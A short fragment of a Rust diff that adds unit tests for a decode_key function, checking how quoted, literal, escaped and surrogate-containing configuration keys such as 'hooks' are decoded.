+        assert_eq!(decode_key("\"back\\\\slash\""), "back\\slash");
+        assert_eq!(decode_key("'hooks'"), "hooks");
+        assert_eq!(decode_key("'\\u0068ooks'"), "\\u0068ooks");
+        assert_eq!(decode_key("hooks"), "hooks");
+        assert_eq!(decode_key("\"\\ud800\""), "\\ud800");
     }
 
     /// Acceptance criterion 2: an empty `[hooks]` section and no presets
